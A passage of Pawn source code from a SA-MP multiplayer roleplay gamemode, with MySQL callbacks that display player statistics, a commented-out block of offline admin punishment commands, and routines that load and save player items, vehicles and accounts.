								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 20:
						{
								cache_get_value_name(0, "TruckSkill",szReturn);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						default: jlevel = 0;
					}

                    cache_get_value_name(0, "UpgradePoints",szReturn);
					new upgrade = strval(szReturn);

					cache_get_value_name(0, "SpawnArmor",szReturn);
					new Float:sarmor = floatstr(szReturn);

                    cache_get_value_name(0, "Cash",szReturn);
					new cash = strval(szReturn);

					cache_get_value_name(0, "Bank",szReturn);
					new bank = strval(szReturn);

					new totalwealth = cash + bank;

					cache_get_value_name(0, "Insurance",szReturn);
					new iInsurance = strval(szReturn);

					new insur[20];
					switch(iInsurance)
					{
						case 1: insur = "County General";
						case 2: insur = "All Saints";
						default: insur = "None";
					}

                    cache_get_value_name(0, "Crimes",szReturn);
					new crimes = strval(szReturn);

					cache_get_value_name(0, "Arrested",szReturn);
					new arrests = strval(szReturn);

					cache_get_value_name(0, "WantedLevel",szReturn);
					new wanted = strval(szReturn);

					new Float:health, Float:armor;

					cache_get_value_name(0, "Health",szReturn);
					health = floatstr(szReturn);

					cache_get_value_name(0, "Armor",szReturn);
					armor = floatstr(szReturn);

                    cache_get_value_name(0, "Pot",szReturn);
					new pot = strval(szReturn);

					cache_get_value_name(0, "Crack",szReturn);
					new crack = strval(szReturn);

                    cache_get_value_name(0, "RadioFreq",szReturn);
					new radiofreq = strval(szReturn);

                    cache_get_value_name(0, "Materials",szReturn);
					new mats = strval(szReturn);

					cache_get_value_name(0, "Rope",szReturn);
					new rope = strval(szReturn);

					cache_get_value_name(0, "Cigars",szReturn);
					new cigars = strval(szReturn);

					cache_get_value_name(0, "Sprunk",szReturn);
					new sprunk = strval(szReturn);

					cache_get_value_name(0, "Spraycan",szReturn);
					new spray = strval(szReturn);

					cache_get_value_name(0, "BiggestFish",szReturn);
					new bigfish = strval(szReturn);

					// Eight line (admin only)
					cache_get_value_name(0, "House",szReturn);
					new house = strval(szReturn);

					cache_get_value_name(0, "Renting",szReturn);
					new rent = strval(szReturn);

					cache_get_value_name(0, "Interior",szReturn);
					new interior = strval(szReturn);

					cache_get_value_name(0, "VirtualWorld",szReturn);
					new vw = strval(szReturn);
					new realvw = vw;

					cache_get_value_name(0, "JailTime",szReturn);
					new jtime = strval(szReturn);

					new
					    szPlayerName[MAX_PLAYER_NAME];

                    cache_get_value_name(0,"Username",szPlayerName);

					// Added
					new married[20];
					cache_get_value_name(0,"MarriedTo",married);

                    cache_get_value_name(0, "RefTokens",szReturn);
					new reftokens = strval(szReturn);

					new sext[16];
					cache_get_value_name(0, "Sex",szReturn);

					if(strval(szReturn) == 1) { sext = "Male"; } else { sext = "Female"; }

					cache_get_value_name(0, "Age",szReturn);
					new age = strval(szReturn);

					cache_get_value_name(0, "Donator",szReturn);
					new donator = strval(szReturn);

					new donatortxt[16];
					if(donator == 0) { donatortxt = "No"; }
					else if(donator == 1) { donatortxt = "Bronze"; }
					else if(donator == 2) { donatortxt = "Silver"; }
					else if(donator == 3) { donatortxt = "Gold"; }
					else { donatortxt = "No"; }

                    cache_get_value_name(0, "NewMutedTotal",szReturn);
					new nmutes = strval(szReturn);

					cache_get_value_name(0, "AdMutedTotal",szReturn);
			        new admutes = strval(szReturn);

			        cache_get_value_name(0, "ReportMutedTotal",szReturn);
			        new rmutes = strval(szReturn);

                    cache_get_value_name(0, "AdminLevel",szReturn);
					new adminlevel = strval(szReturn);

					cache_get_value_name(0, "Banned",szReturn);
					new banned = strval(szReturn);

					cache_get_value_name(0, "Permabanned",szReturn);
					new permabanned = strval(szReturn);

					cache_get_value_name(0, "Disabled",szReturn);
					new disabled = strval(szReturn);

				    SendClientMessage(extraid, COLOR_NEWS,"___________________________________________________________________________________________________");
				    new coordsstring[128];
				    format(coordsstring, sizeof(coordsstring),"%s - (Level: %d) - (Playing hours: %d) - (Gender: %s) - (Age: %d) - (Phone number: %d) - (Warnings: %d)", szPlayerName, level, phours, sext, age, pnumber, warns);
				    SendClientMessage(extraid, COLOR_WHITE, coordsstring);
					format(coordsstring, sizeof(coordsstring),"(%s: %s) - (Rank: %s [%d]) - (Division: %s) - (Job: %s [lvl: %d]) - (Radio freq: %d kHz)", facgang, employer, rank, PlayerInfo[MAX_PLAYERS][pRank], division, jtext, jlevel, radiofreq);
					SendClientMessage(extraid, COLOR_FORSTATS, coordsstring);
			   		format(coordsstring, sizeof(coordsstring),"(Total wealth: $%d) - (Cash: $%d) - (Bank balance: $%d) - (Insurance: %s) - (Married to: %s)", totalwealth, cash, bank, insur, married);
			   		SendClientMessage(extraid, COLOR_WHITE, coordsstring);
					format(coordsstring, sizeof(coordsstring),"(Respect points: %d/%d [$%d]) - (Upgrade Points: %d) - (Spawn armor: %.1f) - (Health: %.1f) - (Armor: %.1f)", respect, expamount, costlevel, upgrade, sarmor, health, armor);
					SendClientMessage(extraid, COLOR_FORSTATS, coordsstring);
			   		format(coordsstring, sizeof(coordsstring),"(Crimes: %d) - (Arrests: %d) - (Wanted Level: %d) - (Materials: %d) - (Pot: %d) - (Crack: %d)", crimes, arrests, wanted, mats, pot, crack);
			   		SendClientMessage(extraid, COLOR_WHITE, coordsstring);
			   		format(coordsstring, sizeof(coordsstring),"(Rope: %d) - (Cigars: %d) - (Sprunk: %d) - (Spray: %d) -  (Biggest fish: %d) - (Referral Tokens: %d) - (Donator: %s)", rope, cigars, sprunk, spray, bigfish, reftokens, donatortxt);
			        SendClientMessage(extraid, COLOR_FORSTATS, coordsstring);
					format(coordsstring, sizeof(coordsstring), "(Admin Level: %d) - (Banned: %d) - (Permabanned: %d) - (Account disabled: %d)", adminlevel, banned, permabanned, disabled);
			  		SendClientMessage(extraid, COLOR_WHITE,coordsstring);
				    format(coordsstring, sizeof(coordsstring), "(House: %d) - (Renting: %d) - (Int: %d) - (VW: %d) - (Real VW: %d) - (Jail: %d secs) - (Mutes: [N: %d] [AD: %d] [R: %d])", house, rent, interior, vw, realvw, jtime, nmutes, admutes, rmutes);
				    SendClientMessage(extraid, COLOR_FORSTATS,coordsstring);
					SendClientMessage(extraid, COLOR_NEWS,"___________________________________________________________________________________________________");
				}
			}

	        // mysql_free_result(sqldb);
	    }
/*		case THREAD_OFFLINE_FINE: {
// // mysql_free_result(sqldb);

	        new
	            szMessage[128],
	            szPlayerIP[20],
	            iPlayerAdminLevel,
	            iPlayerBanned,
	            szReason[128],
	            iPlayerPermabanned,
	            iCash,
	            iBankAccount,
	            iFinedAmount,
	            szPlayerName[MAX_PLAYER_NAME],
	            szResult[256],
				iTotalCashAfterFine;

	        if(mysql_fetch_row_format(szResult, "|",sqldb)) {
				sscanf(szResult, "p<|>dddssdd", iPlayerPermabanned, iPlayerBanned, iPlayerAdminLevel, szPlayerName, szPlayerIP, iBankAccount, iCash);

				if(iPlayerPermabanned > 0)
				    return SendClientMessage(extraid, COLOR_GREY, "The specified player is permanently banned.");

				if(iPlayerAdminLevel > 0)
				    return SendClientMessage(extraid, COLOR_GREY, "You can't fine other administrators.");

				GetPVarString(extraid, "ofinereason", szReason, sizeof(szReason));
				mysql_escape_string(szReason, szReason,sqldb);

				iFinedAmount = GetPVarInt(extraid, "ofineamount");

				iTotalCashAfterFine = iCash - iFinedAmount;
				mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Cash = %d WHERE Username = '%s'", iTotalCashAfterFine, szPlayerName);
				mysql_tquery(sqldb,szQuery);

				format(szMessage, sizeof(szMessage), "AdmCmd: %s was offline fined $%d by %s, reason: %s", szPlayerName, iFinedAmount, GetPlayerNameEx(extraid), szReason);
				Log("logs/admin.log", szMessage);
				format(szMessage, sizeof(szMessage), "AdmCmd: %s was offline fined $%d by %s, reason: %s", szPlayerName, iFinedAmount, GetPlayerNameEx(extraid), szReason);
				ABroadCast(COLOR_LIGHTRED,szMessage,1);
	        } else SendClientMessage(extraid, COLOR_GREY, "The player specified does not exist.");

	        // mysql_free_result(sqldb);
	    }
	    case THREAD_OFFLINE_BAN: {
// // mysql_free_result(sqldb);

	        new
	            szMessage[128],
	            szPlayerIP[20],
	            iPlayerAdminLevel,
	            iPlayerBanned,
	            szReason[128],
	            iPlayerPermabanned,
	            szPlayerName[MAX_PLAYER_NAME],
	            iAccountID,
	            szResult[256];

	        if(mysql_fetch_row_format(szResult, "|",sqldb)) {
				sscanf(szResult, "p<|>ddds[MAX_PLAYER_NAME]s[20]d", iPlayerPermabanned, iPlayerBanned, iPlayerAdminLevel, szPlayerName, szPlayerIP, iAccountID);

				if(iPlayerPermabanned > 0)
				    return SendClientMessage(extraid, COLOR_GREY, "The specified player is already permanently banned.");

				if(iPlayerAdminLevel > 0)
				    return SendClientMessage(extraid, COLOR_GREY, "You can't ban other administrators.");

				GetPVarString(extraid, "obanreason", szReason, sizeof(szReason));
				mysql_escape_string(szReason, szReason,sqldb);

				AddBan(szPlayerIP);

				format(szMessage, sizeof(szMessage), "AdmCmd: %s (IP: %s) was offline banned by %s, reason: %s", szPlayerName, szPlayerIP, GetPlayerNameEx(extraid), szReason);
				Log("logs/ban.log", szMessage);
				ABroadCast(COLOR_LIGHTRED, szMessage, 1);

				mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Banned = 1 WHERE Username = '%s'", szPlayerName);
				mysql_tquery(sqldb,szQuery);
				punishmentLogEx(iAccountID, PlayerInfo[extraid][pID], 4, szMessage, szReason);

				DeletePVar(extraid, "obanreason");
	        } else SendClientMessage(extraid, COLOR_GREY, "The player specified does not exist.");

	        // mysql_free_result(sqldb);
	    }
	    case THREAD_OFFLINE_PRISON: {
			// mysql_free_result(sqldb);

			new
				szMessage[128],
				szPlayerIP[20],
				iPlayerAdminLevel,
				iPlayerPrisonTime,
				iPlayerBanned,
				szReason[128],
				iPlayerPermabanned,
				szPlayerName[MAX_PLAYER_NAME],
				iAccountID,
				szResult[285];

			if(mysql_fetch_row_format(szResult, "|",sqldb)) {
				sscanf(szResult, "p<|>ddds[20]s[19]d", iPlayerPermabanned, iPlayerBanned, iPlayerAdminLevel, szPlayerName, szPlayerIP, iPlayerPrisonTime, iAccountID);
				print(szResult);

				if(iPlayerPermabanned > 0)
					return SendClientMessage(extraid, COLOR_GREY, "The specified player is already permanently banned.");

				if(iPlayerBanned > 0)
					return SendClientMessage(extraid, COLOR_GREY, "The specified player is already banned.");

				if(iPlayerAdminLevel > 0)
					return SendClientMessage(extraid, COLOR_GREY, "You can't warn other administrators.");

				GetPVarString(extraid, "oprisonreason", szReason, sizeof(szReason));
				mysql_escape_string(szReason, szReason,sqldb);

                iPlayerPrisonTime = GetPVarInt(extraid, "oprisontime");

				format(szMessage, sizeof(szMessage), "AdmCmd: %s was offline prisoned by %s, reason: %s", szPlayerName, GetPlayerNameEx(extraid), szReason);
				ABroadCast(COLOR_LIGHTRED, szMessage, 1);
				format(szMessage, sizeof(szMessage), "AdmCmd: %s was offline prisoned by %s, reason: %s", szPlayerName, GetPlayerNameEx(extraid), szReason);
				Log("logs/admin.log", szMessage);
                punishmentLogEx(iAccountID, PlayerInfo[extraid][pID], 2, szMessage, szReason);

    			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Jailed = 3, JailTime = %d, PrisonReason = '%s', PrisonedBy = '%s' WHERE Username = '%s'", iPlayerPrisonTime, szReason, GetPlayerNameExEx(extraid), szPlayerName);
				mysql_tquery(sqldb,szQuery);

				DeletePVar(extraid, "oprisonreason");
				DeletePVar(extraid, "oprisontime");
			} else SendClientMessage(extraid, COLOR_GREY, "The player specified does not exist.");

			// mysql_free_result(sqldb);
	    }
		case THREAD_OFFLINE_WARN: {
			// mysql_free_result(sqldb);

			new
				szMessage[128],
				szPlayerIP[20],
				iPlayerAdminLevel,
				iPlayerWarnings,
				iPlayerBanned,
				szReason[128],
				iPlayerPermabanned,
				szPlayerName[MAX_PLAYER_NAME],
				iAccountID,
				szResult[256];

			if(mysql_fetch_row_format(szResult, "|",sqldb)) {
				sscanf(szResult, "p<|>ddds[24]s[20]dd", iPlayerPermabanned, iPlayerBanned, iPlayerAdminLevel, szPlayerName, szPlayerIP, iPlayerWarnings, iAccountID);
				print(szResult);

				if(iPlayerPermabanned > 0)
					return SendClientMessage(extraid, COLOR_GREY, "The specified player is already permanently banned.");

				if(iPlayerBanned > 0)
					return SendClientMessage(extraid, COLOR_GREY, "The specified player is already banned.");

				if(iPlayerAdminLevel > 0)
					return SendClientMessage(extraid, COLOR_GREY, "You can't warn other administrators.");

				GetPVarString(extraid, "owarnreason", szReason, sizeof(szReason));

				iPlayerWarnings += 1;

				if(iPlayerWarnings >= 3) {
					format(szReason, sizeof(szReason), "%s (had 3 warnings)", szReason);
					SetPVarString(extraid, "obanreason", szReason);

	    			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Warnings = %d WHERE Username = '%s'", iPlayerWarnings, szPlayerName);
					mysql_tquery(sqldb,szQuery);

					punishmentLogEx(iAccountID, PlayerInfo[extraid][pID], 4, szMessage, szReason);
					mysql_escape_string(szPlayerName, szPlayerName,sqldb);

					mysql_format(sqldb,szMessage, sizeof(szMessage), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP FROM players WHERE Username = '%s'", szPlayerName);
					mysql_tquery(sqldb,szMessage, THREAD_OFFLINE_BAN,"i",extraid,sqldb);
					return 1;
				}

				format(szMessage, sizeof(szMessage), "AdmCmd: %s was offline warned by %s, reason: %s", szPlayerName, GetPlayerNameEx(extraid), szReason);
				ABroadCast(COLOR_LIGHTRED, szMessage, 1);
				format(szMessage, sizeof(szMessage), "AdmCmd: %s was offline warned by %s, reason: %s", szPlayerName, GetPlayerNameEx(extraid), szReason);
				Log("logs/admin.log", szMessage);
                punishmentLogEx(iAccountID, PlayerInfo[extraid][pID], 1, szMessage, szReason);

    			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Warnings = %d WHERE Username = '%s'", iPlayerWarnings, szPlayerName);
				mysql_tquery(sqldb,szQuery);

				DeletePVar(extraid, "owarnreason");
			} else SendClientMessage(extraid, COLOR_GREY, "The player specified does not exist.");

			// mysql_free_result(sqldb);
		}
	    case THREAD_OFFLINE_IP_CHECK: {
// // mysql_free_result(sqldb);

	        new
	            szMessage[128],
	            szPlayerIP[20],
	            szPlayerName[MAX_PLAYER_NAME],
	            szResult[256];

	        if(mysql_fetch_row_format(szResult, "|",sqldb)) {
				sscanf(szResult, "p<|>s[20]s[16]", szPlayerName, szPlayerIP);

				format(szMessage, sizeof(szMessage), "Name: %s | IP: %s", szPlayerName, szPlayerIP);
				SendClientMessage(extraid, COLOR_WHITE, szMessage);
	        } else SendClientMessage(extraid, COLOR_GREY, "The player specified does not exist.");

	        // mysql_free_result(sqldb);
	    }
	    case THREAD_CHECK_BANNED: {
// // mysql_free_result(sqldb);

	        new
	            szResult[128],
	            szMessage[128],
	            szPlayerIP[20],
	            szPlayerName[MAX_PLAYER_NAME],
	            iPlayerBan,
	            iPlayerWarnings,
	            iPlayerPermaban;

			if(mysql_fetch_row_format(szResult, "|",sqldb)) {
			    sscanf(szResult, "p<|>ddds[16]s[20]", iPlayerBan, iPlayerPermaban, iPlayerWarnings, szPlayerIP, szPlayerName);
				print(szResult);

			    if(iPlayerPermaban > 0) {
			        SendClientMessage(extraid, COLOR_GREY, "You can't unban this person in-game, they have been permanently banned.");
			        // mysql_free_result(sqldb);
			    } else {
			        if(iPlayerBan > 0) {
			            RemoveBan(szPlayerIP);

						format(szMessage, sizeof(szMessage), "AdmCmd: %s (IP: %s) was unbanned by %s.", szPlayerName, szPlayerIP, GetPlayerNameEx(extraid));
						ABroadCast(COLOR_LIGHTRED, szMessage, 1);

						format(szMessage, sizeof(szMessage), "AdmCmd: %s (IP: %s) was unbanned by %s.", szPlayerName, szPlayerIP, GetPlayerNameEx(extraid));
						Log("logs/ban.log", szMessage);

						if(iPlayerWarnings >= 3) {
							mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Banned = 0, Warnings = 0 WHERE Username = '%s'", szPlayerName);
						} else mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Banned = 0 WHERE Username = '%s'", szPlayerName);
						mysql_tquery(sqldb,szQuery);
			        } else SendClientMessage(extraid, COLOR_GREY, "The player specified isn't banned.");
			    }
			} else SendClientMessage(extraid, COLOR_GREY, "No rows exist with the criteria specified.");

	        // mysql_free_result(sqldb);
	    }*/
	    case THREAD_DELETE_PLAYER_OBJECT: {
	        new
	            string[64],
	            listitem = GetPVarInt(extraid, "deleteObject");

			PlayerToyInfo[extraid][listitem][ptModelID] = 0;
			PlayerToyInfo[extraid][listitem][ptBone] = 1;
			PlayerToyInfo[extraid][listitem][ptRealID] = 0;
			PlayerToyInfo[extraid][listitem][ptPosX] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosY] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosZ] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosX] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosY] = 0.0;
			PlayerToyInfo[extraid][listitem][ptPosZ] = 0.0;

			format(string, sizeof(string), "You have deleted your toy from slot %d.", listitem);
		    ShowPlayerDialogEx(extraid, 0, DIALOG_STYLE_MSGBOX, "Toy Menu - Removal of Toy", string, "OK", "");

		    DeletePVar(extraid, "deleteObject");
		}
	    case THREAD_LOAD_P_ITEMS_CHAIN_1: {
// // mysql_free_result(sqldb);

	        new
	            szReturn[16],
	            iSlot = 0;

	        for(new c; c < cache_num_rows(); c++){
	            cache_get_value_name(c, "ID",szReturn);
	            PlayerToyInfo[extraid][iSlot][ptRealID] = strval(szReturn);

	            cache_get_value_name(c, "ModelID",szReturn);
	            PlayerToyInfo[extraid][iSlot][ptModelID] = strval(szReturn);

	            cache_get_value_name(c, "Bone",szReturn);
	            PlayerToyInfo[extraid][iSlot][ptBone] = strval(szReturn);

				if(PlayerToyInfo[extraid][iSlot][ptBone] > 18 || PlayerToyInfo[extraid][iSlot][ptBone] < 1) PlayerToyInfo[extraid][iSlot][ptBone] = 1;

				cache_get_value_name(c, "PosX",szReturn);
				PlayerToyInfo[extraid][iSlot][ptPosX] = floatstr(szReturn);

				cache_get_value_name(c, "PosY",szReturn);
				PlayerToyInfo[extraid][iSlot][ptPosY] = floatstr(szReturn);

				cache_get_value_name(c, "PosZ",szReturn);
				PlayerToyInfo[extraid][iSlot][ptPosZ] = floatstr(szReturn);

				cache_get_value_name(c, "RotX",szReturn);
				PlayerToyInfo[extraid][iSlot][ptRotX] = floatstr(szReturn);

				cache_get_value_name(c, "RotY",szReturn);
				PlayerToyInfo[extraid][iSlot][ptRotY] = floatstr(szReturn);

				cache_get_value_name(c, "RotZ",szReturn);
				PlayerToyInfo[extraid][iSlot][ptRotZ] = floatstr(szReturn);

				cache_get_value_name(c, "ScaX",szReturn);
				PlayerToyInfo[extraid][iSlot][ptScaleX] = floatstr(szReturn);

				cache_get_value_name(c, "ScaY",szReturn);
				PlayerToyInfo[extraid][iSlot][ptScaleY] = floatstr(szReturn);

				cache_get_value_name(c, "ScaZ",szReturn);
				PlayerToyInfo[extraid][iSlot][ptScaleZ] = floatstr(szReturn);

				// iSlot++;
	        }

	        // mysql_free_result(sqldb);

	        mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT playervehicles.* FROM playervehicles INNER JOIN players ON playervehicles.Owner = players.ID WHERE players.ID = '%d' ORDER BY playervehicles.Owner ASC LIMIT %d", PlayerInfo[extraid][pID], MAX_PLAYERVEHICLES);
	        mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_LOAD_P_ITEMS_CHAIN_2,extraid);
	    }
	    case THREAD_LOAD_P_ITEMS_CHAIN_2: {
// // mysql_free_result(sqldb);

	        new
	            szReturn[16],
	            iSlot = 0;

	        for(new c; c < cache_num_rows(); c++){
	            cache_get_value_name(c, "ID",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvRealID] = strval(szReturn);

	            cache_get_value_name(c, "PosX",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvPosX] = floatstr(szReturn);

	            cache_get_value_name(c, "PosY",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvPosY] = floatstr(szReturn);

	            cache_get_value_name(c, "PosZ",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvPosZ] = floatstr(szReturn);

	            cache_get_value_name(c, "PosAngle",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvPosAngle] = floatstr(szReturn);

	            cache_get_value_name(c, "ModelID",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvModelId] = strval(szReturn);

	            cache_get_value_name(c, "LockType",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvLock] = strval(szReturn);

	            cache_get_value_name(c, "Locked",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvLocked] = strval(szReturn);

	            cache_get_value_name(c, "PaintJob",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvPaintJob] = strval(szReturn);

	            cache_get_value_name(c, "Color1",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvColor1] = strval(szReturn);

	            cache_get_value_name(c, "Color2",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvColor2] = strval(szReturn);

	            cache_get_value_name(c, "Price",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvPrice] = strval(szReturn);

	            cache_get_value_name(c, "Ticket",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvTicket] = strval(szReturn);

	            cache_get_value_name(c, "Weapon0",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvWeapons][0] = strval(szReturn);

	            cache_get_value_name(c, "Weapon1",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvWeapons][1] = strval(szReturn);

	            cache_get_value_name(c, "Weapon2",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvWeapons][2] = strval(szReturn);

	            cache_get_value_name(c, "WepUpgrade",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvWepUpgrade] = strval(szReturn);

	            /*cache_get_value_name(c, "Fuel",szReturn);*/
	            PlayerVehicleInfo[extraid][iSlot][pvFuel] = 100.0; //floatstr(szReturn);

	            cache_get_value_name(c, "Impound",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvImpounded] = strval(szReturn);

	            cache_get_value_name(c, "Spawned",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvSpawned] = strval(szReturn);

	            cache_get_value_name(c, "Disabled",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvDisabled] = strval(szReturn);

	            cache_get_value_name(c, "NumPlate",PlayerVehicleInfo[extraid][iSlot][pvNumberPlate]);

	            cache_get_value_name(c, "Disabled",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvDisabled] = strval(szReturn);

	            cache_get_value_name(c, "Mod0",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][0] = strval(szReturn);

	            cache_get_value_name(c, "Mod1",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][1] = strval(szReturn);

	            cache_get_value_name(c, "Mod2",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][2] = strval(szReturn);

	            cache_get_value_name(c, "Mod3",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][3] = strval(szReturn);

	            cache_get_value_name(c, "Mod4",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][4] = strval(szReturn);

	            cache_get_value_name(c, "Mod5",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][5] = strval(szReturn);

	            cache_get_value_name(c, "Mod6",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][6] = strval(szReturn);

	            cache_get_value_name(c, "Mod7",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][7] = strval(szReturn);

	            cache_get_value_name(c, "Mod8",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][8] = strval(szReturn);

	            cache_get_value_name(c, "Mod9",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][9] = strval(szReturn);

	            cache_get_value_name(c, "Mod10",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][10] = strval(szReturn);

	            cache_get_value_name(c, "Mod11",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][11] = strval(szReturn);

	            cache_get_value_name(c, "Mod12",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][12] = strval(szReturn);

	            cache_get_value_name(c, "Mod13",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][13] = strval(szReturn);

	            cache_get_value_name(c, "Mod14",szReturn);
	            PlayerVehicleInfo[extraid][iSlot][pvMods][14] = strval(szReturn);
	            if(AdminLoggedInBefore[extraid] == 0) LoadPlayerVehicles(extraid);
	            CheckPlayerVehicleForDesync(extraid, PlayerVehicleInfo[extraid][iSlot][pvId]);

				// iSlot++;
	        }

	        // mysql_free_result(sqldb);

	        mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT kills.* FROM kills INNER JOIN players ON kills.killerID = players.ID OR kills.killedID = players.ID WHERE players.ID = '%d' ORDER BY kills.killTS ASC LIMIT 10", PlayerInfo[extraid][pID]);
	        mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_LOAD_P_ITEMS_CHAIN_3,extraid);
	    }
	    case THREAD_LOAD_P_ITEMS_CHAIN_3: {
// // mysql_free_result(sqldb);

     	    // new
	        	// iSlot = 0;

	        for(new c=0; c < cache_num_rows(); c++){
	            // iSlot++;
	            switch(c) {
					case 0: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog0]);
					case 1: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog1]);
					case 2: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog2]);
					case 3: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog3]);
					case 4: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog4]);
					case 5: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog5]);
					case 6: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog6]);
					case 7: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog7]);
					case 8: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog8]);
					case 9: cache_get_value_name(c,"killText",PlayerInfo[extraid][pKillLog9]);
				}
	        }

	        // mysql_free_result(sqldb);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_1: {
			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET Job = %d, Job2 = %d, UpgradePoints = %d, SpawnArmor = '%f', Cash = %d, Bank = %d, Insurance = %d, Crimes = %d, Arrested = %d, WantedLevel = %d, Health = '%f', Armor = '%f', \
			Pot = %d, Crack = %d, Radio = %d, RadioFreq = %d, Phonebook = %d, Dice = %d, CDPlayer = %d, Materials = %d, Rope = %d, Cigars = %d, Sprunk = %d, Spraycan = %d, House = %d, House2 = %d, Renting = %d, Interior = %d, VirtualWorld = %d, Jailed = %d WHERE ID = %d",
			PlayerInfo[extraid][pJob], PlayerInfo[extraid][pJob2], PlayerInfo[extraid][gPupgrade], PlayerInfo[extraid][pSarmor], PlayerInfo[extraid][pCash], PlayerInfo[extraid][pBank], PlayerInfo[extraid][pInsurance], PlayerInfo[extraid][pCrimes],
			PlayerInfo[extraid][pArrested], PlayerInfo[extraid][pWantedLevel], PlayerInfo[extraid][pHealth], PlayerInfo[extraid][pArmor], PlayerInfo[extraid][pPot], PlayerInfo[extraid][pCrack], PlayerInfo[extraid][pRadio], PlayerInfo[extraid][pRadioFreq],
			PlayerInfo[extraid][pPhoneBook], PlayerInfo[extraid][pDice], PlayerInfo[extraid][pCDPlayer], PlayerInfo[extraid][pMats], PlayerInfo[extraid][pRope], PlayerInfo[extraid][pCigar], PlayerInfo[extraid][pSprunk], PlayerInfo[extraid][pSpraycan], PlayerInfo[extraid][pHouse],
			PlayerInfo[extraid][pHouse2], PlayerInfo[extraid][pRenting], PlayerInfo[extraid][pInt], PlayerInfo[extraid][pVW], PlayerInfo[extraid][pJailed], PlayerInfo[extraid][pID]);

			mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_SAVE_ACCOUNT_CHAIN_2,extraid);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_2: {
	        mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET JailTime = %d, Gun0 = %d, Gun1 = %d, Gun2 = %d, Gun3 = %d, Gun4 = %d, Gun5 = %d, Gun6 = %d, Gun7 = %d, Gun8 = %d, Gun9 = %d, Gun10 = %d, Gun11 = %d, Paycheck = %d, PayReady = %d, Hospital = %d, \
			DetSkill = %d, FishSkill = %d, LawSkill = %d, DrugsSkill = %d, SmugglerSkill = %d, ArmsSkill = %d, MechSkill = %d, BoxSkill = %d, TruckSkill = %d, CarSkill = %d, LawyerTime = %d, LawyerFreeTime = %d, DrugsTime = %d, MechTime = %d WHERE ID = %d",
